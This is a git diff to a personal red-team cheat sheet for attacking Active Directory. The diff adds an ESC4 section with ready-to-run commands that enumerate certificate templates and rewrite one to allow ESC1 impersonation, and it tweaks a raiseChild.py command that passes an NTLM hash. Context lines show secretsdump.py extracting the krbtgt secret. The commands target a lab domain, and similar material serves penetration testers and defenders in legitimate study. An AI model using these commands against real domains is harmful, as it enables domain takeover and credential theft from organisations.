@@ -76,6 +76,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 * **[Active Directory Certificate Service](#ADCS)**
 	* [PKI Abuse](#pki-abuse)
 	* [ESC1](#esc1)
+	* [ESC4](#esc4)
 	* [ESC8](#esc8)
 	* [Certifried](#certifried)
 * **[Relay Notes](#relay-notes)**
@@ -382,7 +383,7 @@ secretsdump.py child.domain.local/Administrator@dc01.domain.local -just-dc -k -n
 
 Above steps could be automated with [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) if you obtain a privileged account (i.e. Domain Admin). _-debug flag is <3_
 ```
-raiseChild.py -target-exec dc-1.domain.local child.domain.local/domainadm -hashes :2e8a408a8aec852ef2e458b938b8c071
+raiseChild.py -target-exec dc-1.domain.local child.domain.local/domainadm -hashes :2e8a408a8aec852ef2e458b938b8c071 -debug
 ```
 
 ## Abuse Forest Trust
@@ -893,6 +894,30 @@ python3 gettgtpkinit.py range.net/rangeadm -cert-pfx /opt/certi/rangeadm@range.n
 secretsdump.py range.net/rangeadm@10.8.0.2 -k -no-pass -just-dc -just-dc-user 'range\krbtgt'
 ```
 _Note that you could also recover ntlm has with getnthash.py script_
+
+### ESC4
+This attack is possible when a low-privileged user has _Write Property_ or any other rights to modify template configuration to allow [ESC1](#esc1) attack to work. [modifyCertTemplate.py](https://github.com/fortalice/modifyCertTemplate) will be used in the following steps
+
+1. Verify the vulnerable template with [certi]() 
+```
+python3 certi.py list range.net/peter:'Welcome1234' --dc-ip 10.8.0.2 --enabled
+
+# vulnerable template
+[[..snip..]]
+Permissions
+  Enrollment Permissions
+    Enrollment Rights
+      S-1-5-21-3556610642-5733621-2059236447-513 range\Domain Users
+[[..snip..]]
+```
+
+2. Once vulnerable template has been verified. Modify the necessary requirements to proceed with [ESC1](#esc1) attack path
+```
+# msPKI-Certificate-Name-Flag = (0x1) ENROLLEE_SUPPLIES_SUBJECT
+python3 modifyCertTemplate.py range.net/peter:'Welcome1234' -template ESC4 -value 1 -property msPKI-Certificate-Name-Flag -dc-ip 10.8.0.2
+```
+
+3. Now it should be vulnerable to [ESC1](#esc1)
 
 ### ESC8
 
